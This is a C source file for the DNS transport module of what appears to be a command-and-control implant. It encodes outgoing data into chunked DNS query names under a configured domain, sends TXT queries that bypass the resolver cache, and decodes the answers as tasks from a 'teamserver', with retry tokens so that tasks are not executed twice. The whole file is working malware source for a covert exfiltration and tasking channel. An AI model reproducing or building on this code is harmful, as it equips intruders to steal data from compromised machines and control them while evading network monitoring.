#include <core/TransportDns.h>
#include <core/MiniStd.h>
#include <core/Memory.h>

#ifdef TRANSPORT_DNS

/* URL-safe base64 alphabet, no padding. The teamserver decodes with
 * base64.RawURLEncoding. */
static const CHAR DnsAlphabet[ 64 ] = {
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_'
};

static const CHAR DnsHex[ 16 ] = {
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
};

/* Each message gets a token that stays the same when the message is retried,
 * so the teamserver can return a cached answer instead of running the same
 * task twice. */
static DWORD DnsMessageCounter = 0;

static PCHAR DnsBase64Encode(
    _In_  PBYTE  Data,
    _In_  SIZE_T Length,
    _Out_ PSIZE_T EncodedLength
) {
    PCHAR Out   = NULL;
    SIZE_T Index = 0;

    *EncodedLength = 0;

    if ( ! Data || Length == 0 )
        return NULL;

    Out = MmHeapAlloc( ( ULONG ) ( ( ( Length + 2 ) / 3 ) * 4 + 1 ) );
    if ( ! Out )
        return NULL;

    for ( SIZE_T i = 0; i < Length; i += 3 )
    {
        UINT32 Group = ( ( UINT32 ) Data[ i ] ) << 16;

        if ( i + 1 < Length )
            Group |= ( ( UINT32 ) Data[ i + 1 ] ) << 8;
        if ( i + 2 < Length )
            Group |= ( ( UINT32 ) Data[ i + 2 ] );

        Out[ Index++ ] = DnsAlphabet[ ( Group >> 18 ) & 0x3F ];
        Out[ Index++ ] = DnsAlphabet[ ( Group >> 12 ) & 0x3F ];

        if ( i + 1 < Length )
            Out[ Index++ ] = DnsAlphabet[ ( Group >> 6 ) & 0x3F ];
        if ( i + 2 < Length )
            Out[ Index++ ] = DnsAlphabet[ Group & 0x3F ];
    }

    Out[ Index ] = 0;
    *EncodedLength = Index;

    return Out;
}

static BOOL DnsBase64Decode(
    _In_  PCHAR  Data,
    _In_  SIZE_T Length,
    _Out_ PBYTE* Buffer,
    _Out_ PSIZE_T BufferLength
) {
    PBYTE Out     = NULL;
    SIZE_T Index  = 0;
    UINT32 Group  = 0;
    UINT32 Bits   = 0;

    *Buffer       = NULL;
    *BufferLength = 0;

    if ( ! Data || Length == 0 )
        return FALSE;

    Out = MmHeapAlloc( ( ULONG ) ( ( Length * 3 ) / 4 + 1 ) );
    if ( ! Out )
        return FALSE;

    for ( SIZE_T i = 0; i < Length; i++ )
    {
        INT Value = -1;

        for ( INT j = 0; j < 64; j++ )
        {
            if ( DnsAlphabet[ j ] == Data[ i ] )
            {
                Value = j;
                break;
            }
        }

        if ( Value < 0 )
        {
            /* Invalid character, treat the answer as unusable. */
            MmHeapFree( Out );
            return FALSE;
        }

        Group = ( Group << 6 ) | ( UINT32 ) Value;
        Bits += 6;

        if ( Bits >= 8 )
        {
            Bits -= 8;
            Out[ Index++ ] = ( BYTE ) ( ( Group >> Bits ) & 0xFF );
        }
    }

    *Buffer       = Out;
    *BufferLength = Index;

    return TRUE;
}

static BOOL DnsAppend(
    _Inout_ PCHAR*  Buffer,
    _Inout_ PSIZE_T Length,
    _In_    PCHAR   Data,
    _In_    SIZE_T  DataLength
) {
    PCHAR New = NULL;

    if ( DataLength == 0 )
        return TRUE;

    if ( *Buffer )
        New = MmHeapReAlloc( *Buffer, ( ULONG ) ( *Length + DataLength + 1 ) );
    else
        New = MmHeapAlloc( ( ULONG ) ( *Length + DataLength + 1 ) );

    if ( ! New )
        return FALSE;

    MemCopy( New + *Length, Data, DataLength );
    *Length += DataLength;
    New[ *Length ] = 0;
    *Buffer = New;

    return TRUE;
}

static ULONG DnsDecimal(
    _Out_ PCHAR Buffer,
    _In_  DWORD Value
) {
    CHAR  Temp[ 11 ] = { 0 };
    ULONG Count      = 0;
    ULONG Index      = 0;

    if ( Value == 0 )
    {
        Buffer[ 0 ] = '0';
        return 1;
    }

    while ( Value > 0 )
    {
        Temp[ Count++ ] = ( CHAR ) ( '0' + ( Value % 10 ) );
        Value /= 10;
    }

    while ( Count > 0 )
        Buffer[ Index++ ] = Temp[ --Count ];

    return Index;
}

/* Builds: <seq>.<total>.<token>.<data labels...>.<domain> */
static BOOL DnsBuildQueryName(
    _Out_ PCHAR QueryName,
    _In_  DWORD Seq,
    _In_  DWORD Total,
    _In_  DWORD Token,
    _In_  PCHAR Data,
    _In_  ULONG DataLength,
    _In_  PCHAR Domain
) {
    ULONG Offset = 0;

    Offset += DnsDecimal( &QueryName[ Offset ], Seq );
    QueryName[ Offset++ ] = '.';

    Offset += DnsDecimal( &QueryName[ Offset ], Total );
    QueryName[ Offset++ ] = '.';

    for ( INT i = 7; i >= 0; i-- )
        QueryName[ Offset++ ] = DnsHex[ ( Token >> ( i * 4 ) ) & 0xF ];
    QueryName[ Offset++ ] = '.';

    for ( ULONG i = 0; i < DataLength; i += DNS_LABEL_CHARS )
    {
        ULONG LabelLength = DataLength - i;

        if ( LabelLength > DNS_LABEL_CHARS )
            LabelLength = DNS_LABEL_CHARS;

        if ( i )
            QueryName[ Offset++ ] = '.';

        MemCopy( &QueryName[ Offset ], &Data[ i ], LabelLength );
        Offset += LabelLength;
    }

    QueryName[ Offset++ ] = '.';
    MemCopy( &QueryName[ Offset ], Domain, StringLengthA( Domain ) );
    Offset += StringLengthA( Domain );
    QueryName[ Offset ] = 0;

    return TRUE;
}

/* Queries one TXT record and appends every returned string to Response. */
static BOOL DnsQueryChunk(
    _In_    PCHAR   QueryName,
    _Inout_ PCHAR*  Response,
    _Inout_ PSIZE_T ResponseLength
) {
    PDNS_RECORD Records = NULL;
    DNS_STATUS  Status  = 0;

    Status = Instance->Win32.DnsQuery_A(
        QueryName,
        DNS_TYPE_TEXT,
        DNS_QUERY_BYPASS_CACHE,
        NULL,
        &Records,
        NULL
    );

    if ( Status != 0 || ! Records )
        return FALSE;

    for ( PDNS_RECORD Record = Records; Record; Record = Record->pNext )
    {
        if ( Record->wType != DNS_TYPE_TEXT )
            continue;

        for ( DWORD i = 0; i < Record->Data.Txt.dwStringCount; i++ )
        {
            PCHAR Value = Record->Data.Txt.pStringArray[ i ];

            if ( ! Value )
                continue;

            DnsAppend( Response, ResponseLength, Value, StringLengthA( Value ) );
        }
    }

    Instance->Win32.DnsFree( Records, DnsFreeRecordList );

    return TRUE;
}

BOOL DnsSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    PCHAR   Encoded       = NULL;
    SIZE_T  EncodedLength = 0;
    PCHAR   Domain        = NULL;
    SIZE_T  DomainLength  = 0;
    PCHAR   QueryName     = NULL;
    PCHAR   Response      = NULL;
    SIZE_T  ResponseSize  = 0;
    ULONG   ChunkChars    = 0;
    DWORD   Total         = 0;
    DWORD   Token         = 0;
    BOOL    Success       = FALSE;

    if ( Resp )
    {
        Resp->Buffer = NULL;
        Resp->Length = 0;
    }

    if ( ! Send || ! Send->Buffer || Send->Length == 0 )
        return FALSE;

    if ( ! Instance->Win32.DnsQuery_A || ! Instance->Win32.DnsFree )
        return FALSE;

    if ( ! Instance->Config.Transport.Domain )
        return FALSE;

    DomainLength = StringLengthW( Instance->Config.Transport.Domain );

    if ( DomainLength == 0 )
        return FALSE;

    Domain = MmHeapAlloc( ( ULONG ) ( DomainLength + 1 ) );
    if ( ! Domain )
        return FALSE;

    WCharStringToCharString( Domain, Instance->Config.Transport.Domain, DomainLength + 1 );

    /* strip an optional trailing dot so the name is not doubled */
    DomainLength = StringLengthA( Domain );
    while ( DomainLength > 0 && Domain[ DomainLength - 1 ] == '.' )
        Domain[ --DomainLength ] = 0;

    if ( DomainLength == 0 )
        goto CLEANUP;

    /* Keep the whole name (prefix + labels + domain) below 253 bytes. */
    if ( DomainLength + 24 >= DNS_MAX_NAME )
        goto CLEANUP;

    ChunkChars = DNS_MAX_NAME - DomainLength - 24;
    if ( ChunkChars > DNS_CHUNK_CHARS )
        ChunkChars = DNS_CHUNK_CHARS;
    if ( ChunkChars < 16 )
        goto CLEANUP;

    Encoded = DnsBase64Encode( Send->Buffer, Send->Length, &EncodedLength );
    if ( ! Encoded || EncodedLength == 0 )
        goto CLEANUP;

    Total = ( DWORD ) ( ( EncodedLength + ChunkChars - 1 ) / ChunkChars );
    if ( Total == 0 || Total > 512 )
        goto CLEANUP;

    if ( EncodedLength > DNS_MAX_REQUEST_LENGTH * 4 / 3 + 4 )
        goto CLEANUP;

    /* A retried message reuses its token, so the cached answer is returned
     * instead of executing the task a second time. */
    Token = ( Instance->Session.AgentID * 2654435761u ) ^ ( DnsMessageCounter * 2246822519u );

    QueryName = MmHeapAlloc( DNS_MAX_NAME + 2 );
    if ( ! QueryName )
        goto CLEANUP;

    for ( DWORD Seq = 0; Seq < Total; Seq++ )
    {
        ULONG  Offset = Seq * ChunkChars;
        ULONG  Length = ( ULONG ) ( EncodedLength - Offset );

        if ( Length > ChunkChars )
            Length = ChunkChars;

        DnsBuildQueryName( QueryName, Seq, Total, Token, &Encoded[ Offset ], Length, Domain );
        DnsQueryChunk( QueryName, &Response, &ResponseSize );
    }

    /* The answer is attached to the query that completed the message. If that
     * datagram was lost, the teamserver's cache makes a re-query cheap and
     * idempotent. */
    if ( ResponseSize == 0 && Total > 1 )
    {
        for ( INT Retry = 0; Retry < DNS_RETRY_LAST && ResponseSize == 0; Retry++ )
        {
            ULONG Offset = ( Total - 1 ) * ChunkChars;
            ULONG Length = ( ULONG ) ( EncodedLength - Offset );

            if ( Length > ChunkChars )
                Length = ChunkChars;

            DnsBuildQueryName( QueryName, Total - 1, Total, Token, &Encoded[ Offset ], Length, Domain );
            DnsQueryChunk( QueryName, &Response, &ResponseSize );
        }
    }

    if ( ResponseSize > 0 )
    {
        PBYTE Decoded       = NULL;
        SIZE_T DecodedLength = 0;

        if ( DnsBase64Decode( Response, ResponseSize, &Decoded, &DecodedLength ) )
        {
            if ( Resp )
            {
                Resp->Buffer = Decoded;
                Resp->Length = ( UINT32 ) DecodedLength;
            }
            else
            {
                MmHeapFree( Decoded );
            }

            Success = TRUE;
            DnsMessageCounter++;
        }
    }

CLEANUP:
    if ( QueryName )
        MmHeapFree( QueryName );
    if ( Encoded )
        MmHeapFree( Encoded );
    if ( Response )
        MmHeapFree( Response );
    if ( Domain )
        MmHeapFree( Domain );

    return Success;
}

#endif
